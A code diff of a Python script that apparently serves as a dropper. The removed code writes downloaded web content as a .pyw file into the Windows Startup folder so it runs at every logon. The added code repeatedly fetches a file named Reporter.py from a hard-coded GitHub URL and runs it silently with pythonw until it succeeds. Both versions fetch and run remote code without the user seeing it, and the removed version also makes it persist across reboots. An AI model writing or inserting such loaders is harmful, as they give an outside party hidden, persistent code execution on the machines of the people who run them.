@@ -3,40 +3,37 @@ import subprocess
 import os
 import time
 
-time.sleep(0)
-def download_webpage(url, filename):
-    try:
-        # Fetch the webpage content
-        response = requests.get(url)
-        if response.status_code == 200:
-            # Get the content of the webpage
-            content = response.text
-            
-            # Get the path to the startup folder
-            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup')
-            
-            # Ensure filename has .py extension
-            if not filename.endswith('.pyw'):
-                filename += '.pyw'
-            
-            # Create the file path
-            file_path = os.path.join(startup_folder, filename)
-            
-            # Write the webpage content to a .py file
-            with open(file_path, 'w') as f:
-                f.write(content)
-                
-            print(f"Webpage content downloaded and saved as '{filename}' in the startup folder.")
-        else:
-            print(f"Failed to download webpage. Status code: {response.status_code}")
-    except Exception as e:
-        print(f"An error occurred: {e}")
+def download_and_open_file(url, destination_path):
+    while True:
+        try:
+            response = requests.get(url)
+            response.raise_for_status()  # Raise an HTTPError for bad responses
 
+            with open(destination_path, 'wb') as file:
+                file.write(response.content)
+
+            print(f"File downloaded successfully to {destination_path}")
+
+            # Open the file using the default Python interpreter for .pyw files
+            python_executable = 'pythonw.exe' if os.name == 'nt' else 'pythonw'
+            subprocess.run([python_executable, destination_path])
+
+            break  # Exit the loop if successful
+
+        except requests.exceptions.RequestException as e:
+            print(f"Error downloading the file: {e}")
+
+        except subprocess.CalledProcessError as e:
+            print(f"Error opening the file: {e}")
+
+        # Wait for 30 seconds before retrying
+        time.sleep(30)
+
+if __name__ == "__main__":
     # Replace the URL with the URL of the .pyw file you want to download
-file_url = "https://raw.githubusercontent.com/Lixvinity/winjv/main/Reporter.pyw"
-    
+    file_url = r"https://raw.githubusercontent.com/Lixvinity/winjv/main/Reporter.py"
+
     # Replace the destination path with the path where you want to save the .pyw file
-destination_path = r"C:\WINJV\Storage\Reporter.pwy"
-    
-    # Download and open the .pyw file
-download_and_open_file(file_url, destination_path)
+    destination_path = r"C:\WINJV\Storage\Reporter.pyw"
+
+    download_and_open_file(file_url, destination_path)
